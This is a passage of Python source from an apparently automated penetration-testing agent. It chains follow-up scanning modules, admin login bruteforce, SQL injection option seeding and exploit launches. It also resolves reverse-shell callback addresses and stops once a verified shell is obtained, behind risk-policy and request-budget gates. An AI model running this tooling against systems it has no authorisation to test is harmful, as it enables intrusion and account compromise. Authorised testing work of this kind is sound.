                self._extract_tech_hints(surface_results),
                set(),
            )
        remaining_after_surface = max(0, budget - len(surface_results))
        http_results = self._execute_plan_http_requests(state, http_actions, remaining_after_surface)
        if http_results:
            self._update_knowledge_base_from_results(
                state.knowledge_base,
                http_results,
                [row.get("path") for row in http_results if isinstance(row, dict)],
                self._extract_tech_hints(http_results),
                set(),
            )
        if not selected_paths:
            return surface_results + http_results

        remaining_budget = max(0, budget - len(surface_results) - len(http_results))
        if remaining_budget <= 0:
            return surface_results + http_results

        available = {}
        for m in self._catalog.discover_campaign_modules(
            expanded=bool(getattr(state, "expanded_surface", False))
            or any(path in CLIENT_JS_INTEL_MODULES for path in followup_paths),
        ):
            available[m.get("path")] = m
        for module_path in post_paths:
            if module_path in available:
                continue
            agent = self._catalog.get_agent_metadata(module_path)
            if agent is not None:
                available[module_path] = {
                    "path": module_path,
                    "name": module_path,
                    "agent": agent,
                }

        selected_modules = []
        seen = set()
        for path in selected_paths:
            if path in seen:
                continue
            module_info = available.get(path)
            if module_info:
                selected_modules.append(module_info)
                seen.add(path)
            if len(selected_modules) >= remaining_budget:
                break

        if not selected_modules:
            return surface_results + http_results

        observed_modules = {
            str(path).strip()
            for path in state.knowledge_base.get("observed_modules", [])
            if str(path).strip()
        }
        selected_modules = [
            module for module in selected_modules
            if str(module.get("path", "")).strip() not in observed_modules
            or module_allowed_despite_observed(state.knowledge_base, str(module.get("path", "")).strip())
        ]
        if not selected_modules:
            return surface_results + http_results

        failed_action_keys = self._get_failed_action_keys(state.knowledge_base)
        if failed_action_keys:
            selected_modules = [
                module for module in selected_modules
                if not self._planner_action_keys(module.get("path", "")).intersection(failed_action_keys)
            ]
        if not selected_modules:
            return surface_results + http_results

        # Enforce CMS lock even against LLM-proposed follow-ups.
        selected_modules = self._filter_modules_for_cms_lock(
            selected_modules,
            state.knowledge_base,
            state.scan_specializations,
        )
        selected_modules = self._prune_modules_for_primary_cms(
            selected_modules,
            state.knowledge_base,
        )
        if self._has_authenticated_session(state.knowledge_base):
            selected_modules = [
                module for module in selected_modules
                if not any(token in str(module.get("path", "")).lower() for token in (
                    "login_page_detector",
                    "admin_login_bruteforce",
                ))
            ]
        if not selected_modules:
            return surface_results + http_results

        print_status(f"Execution plan follow-up: running {len(selected_modules)} module(s)")
        followup_results = self._execute_plan_modules_with_options(
            selected_modules,
            state,
            option_overrides=option_overrides,
            verbose=bool(state.verbose),
        )

        selected_paths = [m.get("path") for m in selected_modules if m.get("path")]
        failed_paths = set()
        for row in followup_results:
            if not isinstance(row, dict):
                continue
            path = str(row.get("path", "")).strip()
            if not path:
                continue
            status = str(row.get("status", "")).strip().lower()
            playbook_id = str(execution_plan.get("playbook_id") or "")
            step_id = ""
            for action in actions:
                if isinstance(action, dict) and str(action.get("path", "")).strip() == path:
                    step_id = str(action.get("playbook_step") or action.get("step_id") or "")
                    break
            if playbook_id and step_id:
                record_playbook_execution(
                    state.knowledge_base,
                    playbook_id=playbook_id,
                    step_id=step_id,
                    module_path=path,
                    success=bool(row.get("vulnerable")) or status not in ("error", "skipped"),
                )
            if status == "error":
                failed_paths.add(path)
                continue
            path_low = path.lower()
            if any(token in path_low for token in ("bruteforce", "login", "auth")) and not row.get("vulnerable"):
                failed_paths.add(path)
        self._remember_planner_actions(state.knowledge_base, selected_paths, failed_paths)
        followup_hints = self._extract_tech_hints(followup_results)
        self._update_knowledge_base_from_results(
            state.knowledge_base,
            followup_results,
            selected_paths,
            followup_hints,
            set(),
        )
        return surface_results + http_results + followup_results

    def _execute_plan_modules_with_options(self, modules, state: AgentState, option_overrides=None, verbose=False):
        option_overrides = dict(option_overrides or {})
        for module_path, inferred in self._build_inferred_option_overrides(modules, state).items():
            merged = dict(inferred)
            merged.update(option_overrides.get(module_path, {}))
            option_overrides[module_path] = merged
        results = []
        target_info = state.target_info
        hostname = target_info.get("hostname")
        port = target_info.get("port")
        scheme = target_info.get("scheme")

        for module_info in modules:
            if self._phase_stop_reason(state, "plan-followup"):
                break
            module_path = module_info.get("path")
            result = {
                "module": module_info.get("name", module_path),
                "path": module_path,
                "status": "error",
                "vulnerable": False,
                "message": "",
                "details": {},
            }
            block_reason = self._module_block_reason_for_profile(state, module_path)
            if block_reason:
                result["status"] = "skipped"
                result["message"] = block_reason
                result["details"] = {"safety_profile": self._normalized_safety_profile(state)}
                results.append(result)
                continue
            unreachable_skip = self._unreachable_target_module_skip_reason(state, module_path)
            if unreachable_skip:
                result["status"] = "skipped"
                result["message"] = unreachable_skip
                results.append(result)
                continue
            announced_bruteforce = False
            if "admin_login_bruteforce" in str(module_path).lower():
                hinted_path = (
                    option_overrides.get(module_path, {}).get("path")
                    or option_overrides.get(module_path, {}).get("login_path")
                    or self._select_best_login_path(state.knowledge_base)
                    or "/admin/login"
                )
                print_status(f"Trying admin login bruteforce on {hinted_path}")
                announced_bruteforce = True
            set_thread_output_quiet(not verbose)
            try:
                module_instance = self.framework.module_loader.load_module(
                    module_path,
                    load_only=False,
                    framework=self.framework,
                )
                if not module_instance:
                    result["message"] = "Failed to load module"
                    results.append(result)
                    continue

                self._set_default_target_options(module_instance, hostname, port, scheme)
                self._seed_http_session_from_auth(module_instance, state)
                merged_options = dict(self._infer_auth_option_overrides(module_instance, module_path, state))
                plan_opts = dict(option_overrides.get(module_path, {}) or {})
                option_patch = plan_opts.pop("option_patch", None) if isinstance(plan_opts, dict) else None
                merged_options.update(plan_opts)
                self._apply_safe_module_options(module_instance, merged_options, state=state)
                self._apply_sqli_context_options(module_instance, module_path, state)

                if not self._module_uses_http_client(module_instance) and not self._consume_network_units(
                    state,
                    module=module_instance,
                    module_path=module_path,
                    reason=f"module {module_path}",
                ):
                    results.append(self._budget_skip_result(module_info, "plan-followup"))
                    continue
                outcome = self._module_executor.execute(
                    module_instance,
                    module_path,
                    state,
                    phase="plan-followup",
                    use_exploit_wrapper=str(module_path or "").lower().startswith(
                        ("exploit/", "exploits/")
                    ),
                    option_patch=option_patch if isinstance(option_patch, dict) else None,
                )
                if outcome.get("blocked"):
                    result["status"] = "skipped"
                    result["message"] = outcome.get("error") or "Blocked by agent policy"
                    result["details"] = {
                        "risk": getattr(outcome.get("risk"), "level", "unknown"),
                    }
                    results.append(result)
                    continue
                execution = outcome.get("execution")
                run_result = execution.result if execution is not None else None
                if execution is not None and execution.error and not execution.command_success:
                    raise RuntimeError(execution.error)
                self._annotate_module_run_result(result, module_instance, run_result)
            except Exception as exc:
                result["message"] = f"Error: {exc}"
            finally:
                set_thread_output_quiet(False)
            results.append(result)
            if announced_bruteforce and not verbose and result.get("message"):
                print_info(f"Bruteforce result: {result.get('message')}")
            if verbose:
                icon = "[+]" if result["vulnerable"] else "[-]"
                print_info(f"{icon} {result['path']}: {result.get('message', '')}")
        return results

    def _set_default_target_options(self, module_instance, hostname, port, scheme):
        from interfaces.command_system.builtin.agent.target_option_seed import (
            apply_http_target_options,
        )

        apply_http_target_options(
            module_instance,
            {"hostname": hostname, "port": port, "scheme": scheme},
        )

        # Reverse payloads/listeners often default to 127.0.0.1. Prefer a routable
        # callback: Docker bridge gateway for container targets, else LAN IP.
        if hasattr(module_instance, "lhost"):
            try:
                current_lhost = str(getattr(module_instance, "lhost", "") or "").strip()
            except Exception:
                current_lhost = ""
            from core.utils.lhost_resolver import (
                is_docker_bridge_host,
                resolve_callback_lhost,
            )

            needs_resolve = self._is_loopback_or_unspecified_host(current_lhost)
            if (
                not needs_resolve
                and is_docker_bridge_host(hostname)
                and current_lhost.startswith(("192.168.", "10."))
                and not is_docker_bridge_host(current_lhost)
            ):
                # LAN lhost against a docker-bridge target often dies after connect.
                needs_resolve = True
            if (
                not needs_resolve
                and self._is_loopback_or_unspecified_host(hostname)
                and not is_docker_bridge_host(current_lhost)
                and current_lhost not in ("127.0.0.1", "localhost")
            ):
                # Prefer resolve_callback_lhost (loopback or Docker gateway) over a
                # stale LAN IP for same-host lab targets.
                needs_resolve = True
            if needs_resolve:
                resolved_lhost = resolve_callback_lhost(hostname, port)
                if resolved_lhost:
                    module_instance.set_option("lhost", resolved_lhost)

    def _apply_sqli_context_options(self, module_instance, module_path: str, state: AgentState) -> None:
        """Seed injection / chain module options from agent knowledge base."""
        low = str(module_path or "").lower()
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        risk = {str(x).lower() for x in (kb.get("risk_signals", []) or [])}

        if "sqli_engine" in low or "sql_injection" in low:
            endpoints = [str(e).strip() for e in (kb.get("discovered_endpoints", []) or []) if str(e).strip()][:40]
            params = [str(p).strip() for p in (kb.get("discovered_params", []) or []) if str(p).strip()][:30]
            opts: Dict[str, Any] = {"blind_fallback": False}
            if endpoints:
                opts["scan_paths"] = ",".join(endpoints)
            if params:
                opts["seed_params"] = ",".join(params)
            login_paths = [
                str(p).strip()
                for p in (kb.get("login_paths", []) or [])
                if str(p).strip().startswith("/")
            ][:8]
            if login_paths:
                opts["extra_paths"] = ",".join(login_paths)
            if "waf_or_blocking_detected" in risk:
                opts["waf_detected"] = True
            self._apply_safe_module_options(module_instance, opts, state=state)

        chain_opts = apply_chain_module_options(module_instance, module_path, kb)
        if chain_opts:
            self._apply_safe_module_options(module_instance, chain_opts, state=state)

    def _apply_safe_module_options(self, module_instance, options, state: Optional[AgentState] = None):
        if not isinstance(options, dict):
            return
        if state is not None:
            from interfaces.command_system.builtin.agent.credential_vault import (
                apply_resolved_options,
                get_credential_vault,
            )

            vault = get_credential_vault(
                state=state,
                kb=getattr(state, "knowledge_base", None),
                framework=self.framework,
            )
            apply_resolved_options(module_instance, options, vault)
            return
        for key, value in options.items():
            if not hasattr(module_instance, key):
                continue
            try:
                module_instance.set_option(key, value)
            except Exception:
                continue

    def _safe_option_value(self, module_instance, option_name: str) -> Any:
        if not hasattr(module_instance, option_name):
            return None
        if option_name == "payload":
            try:
                option_descriptor = getattr(type(module_instance), option_name, None)
                if option_descriptor and hasattr(option_descriptor, "to_dict"):
                    payload_info = option_descriptor.to_dict(module_instance)
                    return payload_info.get("display_value") or payload_info.get("value")
            except Exception:
                return None
        try:
            value = getattr(module_instance, option_name)
        except Exception:
            return None
        text = str(value or "")
        if option_name.lower() in ("password", "pass", "passwd", "token", "api_key", "apikey"):
            return "***" if text else ""
        return value

    def _module_runtime_option_snapshot(self, module_instance) -> Dict[str, Any]:
        keys = (
            "target",
            "rhost",
            "rhosts",
            "port",
            "rport",
            "ssl",
            "path",
            "base_path",
            "payload",
            "lhost",
            "lport",
            "username",
            "password",
        )
        snap: Dict[str, Any] = {}
        for key in keys:
            value = self._safe_option_value(module_instance, key)
            if value is None:
                continue
            snap[key] = value
        return snap

    def _execute_exploit_results_with_options(
        self,
        selected_results,
        target_info,
        state=None,
        exploit_option_overrides=None,
        explicit_exploit_paths=None,
        verbose=False,
    ):
        exploit_option_overrides = exploit_option_overrides or {}
        explicit_exploit_paths = explicit_exploit_paths or []
        hostname = target_info.get("hostname")
        port = target_info.get("port")
        scheme = target_info.get("scheme")

        exploit_paths = set([
            self._catalog.normalize_exploit_module_path(r.get("exploit_module"))
            for r in selected_results
            if self._catalog.normalize_exploit_module_path(r.get("exploit_module"))
        ])
        exploit_paths.update([
            p for p in explicit_exploit_paths
            if p and (p.startswith("exploit/") or p.startswith("exploits/"))
        ])
        kb = (
            state.knowledge_base
            if isinstance(state, AgentState) and isinstance(state.knowledge_base, dict)
            else {}
        )
        focus_product = product_chain_still_pending(kb) if kb else ""
        if focus_product:
            chain_exploits = [
                p for p in product_shell_chain_paths(focus_product, include_sqli_shell=False)
                if p.startswith(("exploit/", "exploits/"))
            ]
            filtered = filter_paths_for_product_focus(sorted(exploit_paths), kb)
            ordered: List[str] = []
            seen_ep: set = set()
            for path in chain_exploits + list(filtered):
                if not path or path in seen_ep or not path.startswith(("exploit/", "exploits/")):
                    continue
                if product_focus_skip_reason(path, kb):
                    continue
                seen_ep.add(path)
                ordered.append(path)
            exploit_paths = ordered
            if verbose and ordered:
                print_status(
                    f"Product-focus `{focus_product}`: limiting exploits to {', '.join(ordered)}"
                )
        else:
            exploit_paths = sorted(exploit_paths)
        if not exploit_paths:
            return

        print_status("Exploiting...")
        failed_paths = set()
        attempted_paths = set()
        policy_skip_count = 0
        for exploit_path in exploit_paths:
            if isinstance(state, AgentState):
                if self._phase_stop_reason(state, "exploit"):
                    break
                if self._has_shell_milestone(state):
                    if verbose:
                        print_info(
                            "Strategic stop: shell already obtained; skipping remaining exploits."
                        )
                    break
            if isinstance(state, AgentState):
                forced_protocol = str(getattr(state, "protocol", "") or "").strip().lower()
                if forced_protocol and not path_matches_forced_protocol(exploit_path, forced_protocol):
                    failed_paths.add(exploit_path)
                    print_warning(
                        f"Exploit skipped [{exploit_path}]: conflicts with --protocol {forced_protocol}"
                    )
                    continue
                mismatch_reason = self._module_stack_mismatch_reason(
                    exploit_path,
                    state.knowledge_base,
                )
                if mismatch_reason:
                    failed_paths.add(exploit_path)
                    print_warning(f"Exploit skipped [{exploit_path}]: {mismatch_reason}")
                    continue
                block_reason = self._module_block_reason_for_profile(state, exploit_path)
                if block_reason:
                    failed_paths.add(exploit_path)
                    policy_skip_count += 1
                    print_warning(f"Exploit skipped [{exploit_path}]: {block_reason}")
                    continue
            attempted_paths.add(exploit_path)
            try:
                set_thread_output_quiet(not verbose)
                exploit_instance = self.framework.module_loader.load_module(
                    exploit_path,
                    load_only=False,
                    framework=self.framework,
                )
                if not exploit_instance:
                    failed_paths.add(exploit_path)
                    continue
                self._set_default_target_options(exploit_instance, hostname, port, scheme)
                inferred_auth = {}
                if isinstance(state, AgentState):
                    self._seed_http_session_from_auth(exploit_instance, state)
                    inferred_auth = self._infer_auth_option_overrides(
                        exploit_instance, exploit_path, state
                    )
                    auth_context = self._get_active_auth_context(state.knowledge_base)
                    login_candidates = [
                        str(path) for path in state.knowledge_base.get("login_paths", [])
                        if isinstance(path, str) and path.startswith("/")
                    ][:6]
                    selected_login_path = (
                        str(auth_context.get("login_path") or "").strip()
                        or self._select_best_login_path(state.knowledge_base)
                    )
                    selected_final_path = str(auth_context.get("final_path") or "").strip()
                    if verbose:
                        set_thread_output_quiet(False)
                        print_info(
                            f"Exploit auth inference [{exploit_path}]: "
                            f"active_auth={bool(auth_context)} "
                            f"selected_login_path={selected_login_path or '-'} "
                            f"selected_final_path={selected_final_path or '-'} "
                            f"login_candidates={login_candidates}"
                        )
                        print_info(
                            f"Exploit inferred overrides [{exploit_path}]: "
                            f"{inferred_auth if inferred_auth else 'none'}"
                        )
                    set_thread_output_quiet(not verbose)
                merged_options = dict(inferred_auth)
                if isinstance(state, AgentState):
                    inferred_module = self._build_inferred_option_overrides(
                        [{"path": exploit_path}],
                        state,
                    ).get(exploit_path, {})
                    merged_options.update(inferred_module)
                merged_options.update(exploit_option_overrides.get(exploit_path, {}))
                self._apply_safe_module_options(
                    exploit_instance, merged_options, state=state if isinstance(state, AgentState) else None
                )
                runtime_snapshot = self._module_runtime_option_snapshot(exploit_instance)
                if runtime_snapshot and verbose:
                    set_thread_output_quiet(False)
                    print_info(f"Exploit runtime options [{exploit_path}]: {runtime_snapshot}")
                    set_thread_output_quiet(not verbose)
                sessions_before = set()
                browser_before = set()
                if hasattr(self.framework, "session_manager"):
                    sessions_before = set(self.framework.session_manager.sessions.keys())
                    browser_before = set(self.framework.session_manager.browser_sessions.keys())
                self.framework.current_module = exploit_instance
                if (
                    isinstance(state, AgentState)
                    and not self._module_uses_http_client(exploit_instance)
                    and not self._consume_network_units(state, 1)
                ):
                    failed_paths.add(exploit_path)
                    print_warning(f"Exploit skipped [{exploit_path}]: request budget exhausted")
                    continue
                if isinstance(state, AgentState):
                    outcome = self._module_executor.execute(
                        exploit_instance,
                        exploit_path,
                        state,
                        phase="exploit",
                        use_exploit_wrapper=True,
                    )
                    if outcome.get("blocked"):
                        failed_paths.add(exploit_path)
                        print_warning(
                            f"Exploit blocked [{exploit_path}]: {outcome.get('error')}"
                        )
                        continue
                    # Only count real launches toward product-focus exhaustion —
                    # quarantine/policy blocks must not lift the DVWA shell gate.
                    self._record_product_shell_wrapper_attempt(state, exploit_path)
                    execution = outcome.get("execution")
                    success = bool(execution and execution.success)
                else:
                    success = self.framework.execute_module()
                    if isinstance(state, AgentState):
                        self._record_product_shell_wrapper_attempt(state, exploit_path)
                sessions_after = set()
                browser_after = set()
                if hasattr(self.framework, "session_manager"):
                    sessions_after = set(self.framework.session_manager.sessions.keys())
                    browser_after = set(self.framework.session_manager.browser_sessions.keys())
                new_standard = sorted(sessions_after - sessions_before)
                new_browser = sorted(browser_after - browser_before)
                if isinstance(state, AgentState) and (new_standard or new_browser):
                    provenance = state.knowledge_base.setdefault("session_provenance", {})
                    if isinstance(provenance, dict):
                        for session_id in new_standard + new_browser:
                            provenance[str(session_id)] = exploit_path
                reverse_callback_missing = False
                set_thread_output_quiet(False)
                if verbose:
                    if new_standard or new_browser:
                        print_info(
                            f"Exploit session delta [{exploit_path}]: "
                            f"standard+={new_standard}, browser+={new_browser}"
                        )
                    else:
                        print_info(
                            f"Exploit session delta [{exploit_path}]: no new session "
                            f"(standard={len(sessions_after)}, browser={len(browser_after)})"
                        )
                if not (new_standard or new_browser):
                    reverse_listener_timeout = (
                        getattr(exploit_instance, "payload_type", None) == "reverse"
                        and not bool(getattr(exploit_instance, "_session_received", False))
                    )
                    if reverse_listener_timeout:
                        listener_connections = 0
                        active_listener = getattr(exploit_instance, "active_listener", None)
                        if active_listener is not None and hasattr(active_listener, "connections"):
                            try:
                                listener_connections = len(active_listener.connections)
                            except Exception:
                                listener_connections = 0
                        print_warning(
                            f"Exploit reverse callback not observed [{exploit_path}] "
                            f"(listener_connections={listener_connections})"
                        )
                        diagnostic = self._reverse_callback_diagnostic(
                            exploit_instance,
                            target_info,
                        )
                        if diagnostic:
                            print_warning(diagnostic)
                        reverse_callback_missing = True
                set_thread_output_quiet(False)
                session_created = bool(new_standard or new_browser)
                verified_ids: List[str] = []
                if session_created:
                    success = True
                    failed_paths.discard(exploit_path)
                    if isinstance(state, AgentState):
                        verified_ids = self._verify_exploit_sessions(
                            state,
                            new_standard + new_browser,
                            exploit_path=exploit_path,
                        )
                    if verified_ids:
                        self._record_exploit_confirmed_finding(
                            state,
                            exploit_path,
                            session_ids=verified_ids,
                        )

                if success and reverse_callback_missing:
                    failed_paths.add(exploit_path)
                    print_warning(
                        f"Exploit completed but no reverse session was established: {exploit_path}"
                    )
                elif success:
                    if session_created and verified_ids:
                        print_success(
                            f"Exploit succeeded: {exploit_path} (verified session)"
                        )
                        if isinstance(state, AgentState) and self._stop_exploit_wave_after_shell(
                            state, phase_name="exploit"
                        ):
                            print_info(
                                f"Valid shell via {exploit_path}; stopping exploit wave."
                            )
                            break
                    elif session_created:
                        print_warning(
                            f"Exploit opened session but neutral verify failed "
                            f"[{exploit_path}]; trying next path."
                        )
                    else:
                        print_success(f"Exploit succeeded: {exploit_path}")
                else:
                    failed_paths.add(exploit_path)
                    print_warning(f"Exploit failed: {exploit_path}")
            except Exception as exc:
                failed_paths.add(exploit_path)
                set_thread_output_quiet(False)
                print_warning(f"Error launching {exploit_path}: {exc}")
            finally:
                set_thread_output_quiet(False)
        if (
            isinstance(state, AgentState)
            and policy_skip_count
            and not attempted_paths
            and is_shell_operator_goal(self._operator_campaign_goal(state))
        ):
            print_warning(
                f"All {policy_skip_count} exploit candidate(s) blocked by risk policy. "
                "Re-run with --approve-risk intrusive (or --profile internal-lab) to allow shell/RCE modules."
            )
        if isinstance(state, AgentState):
            self._remember_planner_actions(state.knowledge_base, attempted_paths, failed_paths)
